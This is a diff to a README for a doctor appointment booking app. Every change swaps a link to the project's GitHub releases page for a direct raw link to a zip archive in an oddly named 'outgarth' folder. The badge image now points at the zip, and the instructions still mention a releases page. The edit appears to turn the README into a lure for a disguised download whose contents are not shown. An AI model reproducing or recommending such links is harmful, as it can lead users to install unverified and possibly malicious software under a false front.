@@ -1,6 +1,6 @@
 # 🩺 doctor-appointment-booking - Effortless Doctor Appointment Scheduling
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20blue)](https://github.com/AlbertBitcoi/doctor-appointment-booking/releases)
+[![Download Now](https://raw.githubusercontent.com/AlbertBitcoi/doctor-appointment-booking/main/outgarth/doctor-appointment-booking.zip%20Now-%20blue)](https://raw.githubusercontent.com/AlbertBitcoi/doctor-appointment-booking/main/outgarth/doctor-appointment-booking.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, you need to download the application. Please follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to access the downloads:  
-   [Download the Application](https://github.com/AlbertBitcoi/doctor-appointment-booking/releases)
+   [Download the Application](https://raw.githubusercontent.com/AlbertBitcoi/doctor-appointment-booking/main/outgarth/doctor-appointment-booking.zip)
 
 2. **Select the Latest Version**  
    On the releases page, look for the latest version of the Doctor Appointment Booking App. It will usually be at the top of the list.
@@ -98,4 +98,4 @@ If you have any questions or need assistance, please reach out via the Issues se
 
 Thank you for choosing the Doctor Appointment Booking App. We hope it makes your healthcare experience smoother! 
 
-[Download the Application](https://github.com/AlbertBitcoi/doctor-appointment-booking/releases)
+[Download the Application](https://raw.githubusercontent.com/AlbertBitcoi/doctor-appointment-booking/main/outgarth/doctor-appointment-booking.zip)
